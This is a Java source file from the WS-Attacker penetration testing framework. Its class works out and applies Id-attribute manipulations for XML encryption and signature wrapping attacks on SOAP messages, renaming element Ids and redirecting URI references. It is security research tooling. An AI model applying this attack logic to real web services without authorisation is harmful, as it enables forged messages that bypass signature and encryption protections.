/**
 * WS-Attacker - A Modular Web Services Penetration Testing Framework Copyright
 * (C) 2013 Dennis Kupser
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */

package wsattacker.library.xmlencryptionattack.avoidingengine.wrappingoracles.weakness;

import java.util.List;
import java.util.logging.Level;
import javax.xml.xpath.XPathExpressionException;
import org.apache.log4j.Logger;
import org.w3c.dom.DOMException;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import wsattacker.library.signatureWrapping.util.exception.InvalidWeaknessException;
import wsattacker.library.signatureWrapping.util.id.RandomIdGenerator;
import wsattacker.library.xmlencryptionattack.avoidingengine.wrappingoracles.WrapModeEnum;
import wsattacker.library.xmlencryptionattack.encryptedelements.AbstractEncryptionElement;
import wsattacker.library.xmlencryptionattack.encryptedelements.data.EncryptedDataElement;
import wsattacker.library.xmlencryptionattack.encryptedelements.key.EncryptedKeyElement;
import wsattacker.library.xmlencryptionattack.util.HelperFunctions;
import wsattacker.library.xmlutilities.dom.DomUtilities;

public class EncryptionAttributeIdWeakness
    extends AbstractWeaknessComposite
{

    private final static Logger LOG = Logger.getLogger( EncryptionAttributeIdWeakness.class );

    private int m_MaxPosAttr = 2;

    public EncryptionAttributeIdWeakness( AbstractEncryptionElement encPay, EncryptedKeyElement encKey )
        throws InvalidWeaknessException
    {
        this.m_EncKey = encKey;
        this.m_EncPay = encPay;
        determineEncSignMode( encPay, encKey );
        String payName = encPay.getEncryptedElement().getLocalName();

        if ( WrapModeEnum.WRAP_ENC_ELEMENT == m_WrapMode
            || ( payName.equals( "EncryptedKey" ) && WrapModeEnum.WRAP_ENCKEY_WRAP_ENCDATA == m_WrapMode ) )
        {
            if ( !encPay.getIdValue().equals( "" ) )
                setPossibleWeaks( m_MaxPosAttr );
            else
                LOG.info( "No EncryptionIdWeakness" );
        }
        else
        {
            EncryptedKeyRefWeakness encKeyRefWeak =
                (EncryptedKeyRefWeakness) FactoryWeakness.generateWeakness( WeaknessType.ENCKEY_REF_WEAKNESS, encPay,
                                                                            encKey );
            m_WeaknessList.add( encKeyRefWeak );

            if ( ( WrapModeEnum.ENCKEY_WRAP_ENCDATA == m_WrapMode )
                || ( WrapModeEnum.WRAP_ENCKEY_WRAP_ENCDATA == m_WrapMode && encPay.getEncryptedElement().getLocalName().equals( "EncryptedData" ) ) ) // signed
                                                                                                                                                      // encData
                                                                                                                                                      // +
                                                                                                                                                      // encKey
            {
                m_MaxPosAttr = 1 + encKeyRefWeak.getPossibleNumWeaks(); // hold id + (append new id, delete old and
                                                                        // append new id, delete all)
                setPossibleWeaks( m_MaxPosAttr );
            }
            else if ( WrapModeEnum.WRAP_ENCKEY_ENCDATA == m_WrapMode ) // encData + signed encKey
            {
                setPossibleWeaks( (int) ( m_MaxPosAttr * encKeyRefWeak.getPossibleNumWeaks() ) );
            }
        }
    }

    @Override
    public int getPossibleNumWeaks()
    {
        return m_PossibleWeaks;
    }

    private void setPossibleWeaks( int numberOfPossibilities )
    {
        this.m_PossibleWeaks = numberOfPossibilities;
    }

    /**
     * There are different possibilites for every encrypted signed mode. Adjusts the attribute of the affected elements.
     * There are depends on the mode.
     * 
     * @param index
     * @param encKey
     * @param payloadElement
     */
    @Override
    public void abuseWeakness( int index, Element encKey, Element payloadElement )
    {
        try
        {
            int keyRefWeakIdx = index / m_MaxPosAttr;
            index %= m_MaxPosAttr;

            // can be adapt for every mode
            switch ( m_WrapMode )
            {
                case WRAP_ENC_ELEMENT:
                    handleWrapEncryptedElement( index, encKey, payloadElement );
                    break;
                case ENCKEY_WRAP_ENCDATA:
                    handleEncKeyWrapEncData( index, keyRefWeakIdx, encKey, payloadElement );
                    break;
                case WRAP_ENCKEY_ENCDATA:
                    handleWrapEncKeyEncData( index, keyRefWeakIdx, encKey, payloadElement );
                    break;
                case WRAP_ENCKEY_WRAP_ENCDATA:
                    handleWrapEncKeyWrapEncData( index, keyRefWeakIdx, encKey, payloadElement );
                    break;
            }
        }
        catch ( XPathExpressionException ex )
        {
            java.util.logging.Logger.getLogger( EncryptionAttributeIdWeakness.class.getName() ).log( Level.SEVERE,
                                                                                                     null, ex );
        }

    }

    private String changeIdOfPayElement( Element payElement )
    {
        String randID = null;
        Node idAttr = payElement.getAttributes().getNamedItem( "Id" );

        if ( null != idAttr )
        {
            randID = RandomIdGenerator.rotate_ID( idAttr.getNodeValue() );
            payElement.getAttributes().getNamedItem( "Id" ).setTextContent( randID );
            LOG.info( "Id of element " + payElement.getLocalName() + " changed to Id=" + randID );
            return randID;
        }
        else
        {
            LOG.info( payElement.getLocalName() + " has no id attribute" );
            throw new IllegalArgumentException( "No Id-Attribute but Id has to change?" );
        }
    }

    private void handleWrapEncryptedElement( int index, Element encKey, Element payloadElement )
    {
        switch ( index )
        {
        // 0) payload gets a new attribute value
            case 0:
                changeIdOfPayElement( payloadElement );
                break;
            // 1) payload and signed encrypted element have the same attribute value
            case 1:
                // LOG.info("Hold " + payloadElement.getLocalName() + " Id = " + payloadElement.getAttribute("Id"));
                break;
            // 2) remove attribute from payload // TODO: make sense?
            // case 2:
            // payloadElement.removeAttributeNode(payloadAttribute);
            // break;

            default:

                String error = "Index out of range: '" + index + "'";
                LOG.warn( error );
        }

    }

    private void handleEncKeyWrapEncData( int index, int keyRefWeakIdx, Element encKey, Element payloadElement )
        throws DOMException, XPathExpressionException
    {
        switch ( index )
        {
        // 0,1) Payload gets a new attribute value (new id => keyref has 2 possibilities)
            case 0:
            case 1:
                changeIdOfPayElement( payloadElement );
                m_WeaknessList.get( 0 ).abuseWeakness( index, encKey, payloadElement );
                break;
            // 2) keep id + delete references
            case 2:
                // LOG.info( "Hold EncryptedData Id =" + payloadElement.getAttribute( "Id" ) );
                m_WeaknessList.get( 0 ).abuseWeakness( index, encKey, payloadElement );
                break;
            // 2) keep id
            case 3:
                LOG.info( "Hold EncryptedData Id =" + payloadElement.getAttribute( "Id" ) );
                break;

            default:

                String error = "Index out of range: '" + index + "'";
                LOG.warn( error );

        }
    }

    private void handleWrapEncKeyEncData( int index, int keyRefWeakIdx, Element encKey, Element payloadElement )
        throws DOMException, XPathExpressionException
    {
        // payload encKey
        switch ( index )
        {
            case 0:
                String oldId = getOrigIdOfEncKey( payloadElement );
                changeIdOfPayElement( payloadElement );
                if ( !m_WeaknessList.isEmpty() )
                {
                    if ( payloadElement.getLocalName().equals( "EncryptedKey" ) && null != oldId )
                    {
                        changeReferenceInEncDataPay( payloadElement, oldId );
                    }

                    m_WeaknessList.get( 0 ).abuseWeakness( keyRefWeakIdx, payloadElement, payloadElement );

                }
                break;
            // 1) keep id
            case 1:
                if ( !m_WeaknessList.isEmpty() )
                    m_WeaknessList.get( 0 ).abuseWeakness( keyRefWeakIdx, payloadElement, null );
                // LOG.info("Hold " + payloadElement.getLocalName() + " Id = " + payloadElement.getAttribute("Id"));
                break;

            default:
                String error = "Index out of range: '" + index + "'";
                LOG.warn( error );

        }
    }

    private String getOrigIdOfEncKey( Element payloadElement )
        throws DOMException
    {
        String oldId = null;
        Node idAttr = payloadElement.getAttributes().getNamedItem( "Id" );
        if ( null != idAttr )
        {
            if ( !idAttr.getTextContent().equals( "" ) )
                oldId = idAttr.getTextContent();
        }

        return oldId;
    }

    private void handleWrapEncKeyWrapEncData( int index, int keyRefWeakIdx, Element encKey, Element payloadElement )
        throws XPathExpressionException
    {
        // payloadElement => encData || encKey
        if ( payloadElement.getLocalName().equals( "EncryptedData" ) )
        {
            handleEncKeyWrapEncData( index, keyRefWeakIdx, encKey, payloadElement );
        }
        else if ( payloadElement.getLocalName().equals( "EncryptedKey" ) ) // only have to change id + wrapperPos ->
                                                                           // EncKeyRef-Handling over encData payload
        {
            String oldId = getOrigIdOfEncKey( payloadElement );

            handleWrapEncryptedElement( index, null, payloadElement );

            if ( null != oldId )
                changeReferenceInEncDataPay( payloadElement, oldId );
        }
        else
            throw new IllegalArgumentException( "No valid payload in SignEncKeySignEncData mode!" );
    }

    private void changeReferenceInEncDataPay( Element keyPayElement, String origKeyIdVal )
        throws DOMException, XPathExpressionException
    {
        EncryptedDataElement attackEncData = HelperFunctions.getEncDataOfEncryptedKey( (EncryptedKeyElement) m_EncPay );
        Element attackDataEl = attackEncData.getAttackProperties().getAttackPayloadElement();
        List<? extends Node> referenced =
            (List<Element>) DomUtilities.evaluateXPath( keyPayElement.getOwnerDocument(),
                                                        String.format( "//*[@URI='#%s']", origKeyIdVal ) );
        if ( null != attackDataEl )
        {
            for ( int i = 0; referenced.size() > i; i++ )
            {
                int containModeData = attackDataEl.compareDocumentPosition( referenced.get( i ) );
                if ( 0 == containModeData || 0 < ( Node.DOCUMENT_POSITION_CONTAINED_BY & containModeData )
                    || 0 < ( Node.DOCUMENT_POSITION_CONTAINS & containModeData ) )
                {
                    referenced.get( i ).getAttributes().getNamedItem( "URI" ).setTextContent( "#"
                                                                                                  + keyPayElement.getAttribute( "Id" ) );
                }
            }
        }
    }

    public int getMaxPosAttr()
    {
        return m_MaxPosAttr;
    }
}
